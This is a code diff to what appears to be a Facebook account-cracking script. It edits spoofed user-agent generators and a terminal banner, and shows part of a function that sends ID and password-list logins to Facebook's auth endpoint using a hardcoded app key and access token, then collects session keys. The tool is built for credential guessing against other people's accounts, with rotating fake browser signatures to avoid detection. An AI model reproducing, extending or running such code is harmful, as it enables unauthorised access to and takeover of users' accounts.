@@ -75,7 +75,7 @@ for agent in range(10000):
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96'
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0'
         h=random.randrange(73,100)
         i='0'
         j=random.randrange(4200,4900)
@@ -90,13 +90,13 @@ for agent in range(10000):
 
 """ugen=[]
 for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 14;'
+        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
         b=random.choice(['6','7','8','9','10','11','12'])
         c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.116'
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
         h=random.randrange(73,100)
         i='0'
         j=random.randrange(4200,4900)
@@ -107,7 +107,7 @@ for agent in range(10000):
 
 #───────────────[BIT ROOM]───────────────────────── #
 import os, platform, time, sys
-print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mAssalam O Alaikum\33[1;91m⊁ ')
+print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mJai Shree Ram\33[1;91m⊁ ')
 time.sleep(1)
 os.system('clear')
 import os, platform, time, sys
@@ -644,7 +644,6 @@ def api1(ids,names,passlist):
     'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
     'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 }
-
             po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
             if 'session_key' in po:
                 uid = str(po['uid'])
